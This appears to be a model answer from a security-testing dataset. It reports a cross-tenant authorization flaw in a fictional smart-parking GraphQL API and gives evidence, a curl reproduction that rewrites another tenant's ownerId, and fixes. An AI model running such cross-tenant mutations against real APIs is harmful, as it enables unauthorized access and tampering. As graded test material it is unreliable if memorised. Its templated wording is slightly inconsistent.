# Expected Response

## System
- **Domain:** Parking / Smart City Infrastructure
- **System:** ParkIQ Management API
- **Example ID:** GQL-0200

## Priority Findings

### Finding 1: Smart Parking — BOLA via updateIntersection Linked Resource Exposes Cross-Tenant Intersection Data (Pattern 1.2)
**Severity:** High
**Category:** BOLA / Related or Linked Resources

**Summary:**
Per §4.0 (RISK-GQL-200): The `getResource`/`getIntersection` resolver fetches by `id` only, without verifying `tenantId` ownership of the parent resource. Per §5.0 (Pattern 1.2 — related or linked resources): the `updateIntersection` mutation traverses linked parking intersection nodes without checking ownership. An attacker from `tenant-1226` submitted `updateIntersection(id: "I-2200", input: {status: "approved", ownerId: "attacker-12267bb3"})` against an intersection node belonging to `tenant-7bb3`, receiving `CONFIDENTIAL-12267bb3`. In Smart Parking / Smart City, unauthorized modification of intersection nodes affects traffic signal synchronization and public safety.

**Evidence from HAR:**
- Request: `POST https://api.parkiq-management-ap.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-1226`
- Mutation: `updateIntersection(id: "I-2200", input: {status: "approved", ownerId: "attacker-12267bb3"}) { nodeId status }`
- Response `200 OK`: `tenantId: "tenant-7bb3"`, `ownerId: "other-user-12267bb3"`, `sensitiveField: "CONFIDENTIAL-12267bb3"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-12267bb3`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-200 | getIntersection resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 1.2 | Related/linked resource — intersection node without parent auth |
| HAR mutation | id: "I-2200" | Cross-tenant parking intersection node |
| HAR response | tenantId | tenant-7bb3 returned to tenant-1226 |
| HAR response | sensitiveField | CONFIDENTIAL-12267bb3 |
| HAR header | x-request-id | req-12267bb3 |

## Steps to Reproduce

### Step 1 — updateIntersection linked resource BOLA (HAR)
```bash
curl -s -X POST https://api.parkiq-management-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-1226" \
  -d '{"query": "mutation { updateIntersection(id: \"I-2200\", input: {status: \"approved\", ownerId: \"attacker-12267bb3\"}) { nodeId status } }"}'
```
**Vulnerable:** `tenant-7bb3` intersection node mutated, returns `CONFIDENTIAL-12267bb3`. **Secure:** FORBIDDEN.

## Remediation
1. Resolver: `WHERE intersection_id = $id AND tenant_id = $jwt.tenantId`.
2. Validate all linked intersection nodes share the caller's `tenantId` before mutation.
3. Strip `ownerId` from intersection input types.
4. Redis cache key: `intersection:{tenantId}:{intersectionId}`.
